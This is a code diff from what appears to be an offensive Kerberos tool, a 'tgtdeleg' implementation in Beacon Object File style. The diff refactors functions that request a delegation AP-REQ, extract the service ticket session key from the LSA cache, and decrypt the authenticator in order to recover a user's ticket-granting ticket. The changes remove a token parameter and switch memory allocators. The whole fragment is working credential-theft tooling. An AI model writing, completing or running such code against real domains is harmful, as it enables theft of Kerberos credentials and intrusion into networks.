@@ -38,10 +38,10 @@ LONG RequestApReq(char* spn, PUCHAR* apreq, PULONG apreqSize, BOOL checkDelegate
     return status;
 }
 
-NTSTATUS GetKeyFromCache(HANDLE hToken, char* target, LONG encType, PUCHAR* key, PULONG keySize) {
+NTSTATUS GetKeyFromCache(char* target, LONG encType, PUCHAR* key, PULONG keySize) {
     HANDLE hLsa;
     *key = NULL;
-    NTSTATUS status = GetLsaHandle(hToken, FALSE, &hLsa);
+    NTSTATUS status = GetLsaHandle(FALSE, &hLsa);
     if (NT_SUCCESS(status)) {
         ULONG authPackage;
         LSA_STRING krbAuth = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
@@ -114,11 +114,11 @@ NTSTATUS KerberosDecrypt(DWORD keyUsage, KERB_ENCRYPTION_KEY* key, ASN1octetstri
         status = pEcrypt->Initialize(key->keyvalue.value, key->keyvalue.length, keyUsage, &pContext);
         if (status == 0) {
             out->length = in->length;
-            out->value = KERNEL32$LocalAlloc(LPTR, out->length);
+            out->value = MSVCRT$calloc(out->length, sizeof(unsigned char));
             if (out->value != NULL) {
                 status = pEcrypt->Decrypt(pContext, in->value, in->length, out->value, (DWORD*)&out->length);
                 if (status != 0) {
-                    KERNEL32$LocalFree(out->value);
+                    MSVCRT$free(out->value);
                     out->value = NULL;
                 }
             } else {
@@ -156,7 +156,7 @@ PBYTE SearchOID(LPCVOID data, SIZE_T size) {
     return res;
 }
 
-void execute_tgtdeleg(WCHAR** dispatch, HANDLE hToken, char* spn) {
+void execute_tgtdeleg(WCHAR** dispatch, char* spn) {
     PUCHAR apreq;
     ULONG apreqSize;
     LONG status = RequestApReq(spn, &apreq, &apreqSize, TRUE);
@@ -175,7 +175,7 @@ void execute_tgtdeleg(WCHAR** dispatch, HANDLE hToken, char* spn) {
                     PRINT(dispatch, "[*] Authenticator etype: %s\n", GetEncryptionTypeString(apReqAuthType));
                     PUCHAR key;
                     ULONG keySize;
-                    status = GetKeyFromCache(hToken, spn, apReqAuthType, &key, &keySize);
+                    status = GetKeyFromCache(spn, apReqAuthType, &key, &keySize);
                     if (NT_SUCCESS(status)) {
                         PRINT(dispatch, "[*] Successfully extracted the service ticket session key\n");
                         ASN1octetstring_t authenticatorPacked;
